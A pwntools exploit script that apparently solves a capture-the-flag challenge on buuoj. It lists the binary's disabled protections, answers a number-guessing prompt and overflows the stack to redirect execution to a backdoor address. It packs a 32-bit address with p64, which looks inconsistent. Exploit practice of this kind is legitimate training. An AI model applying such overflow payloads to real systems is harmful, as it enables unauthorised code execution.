'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments

1. extract the binary from bmp
2. pass the check logic to reach loc_804885B
3. stack overflow hijack the return address to backdoor
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "26501" 
filename = "./miscpwnn"
elf = ELF(filename)
# context(arch="amd64", os="linux")
context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

backdoor_addr = 0x080485B6
buffer_overflow_size = 0x1C + 4
appending_string = cyclic(buffer_overflow_size)

def B():
    gdb.attach(io)
    pause()


def pwn():
    io.sendlineafter(b'How many mountains do you want?\n', b'255')
    io.sendlineafter(b'How many mountains can you take each time?\n', b'30')
    io.sendlineafter(b'How many mountains do you move?\n', b'29')
    payload = appending_string + p64(backdoor_addr)
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
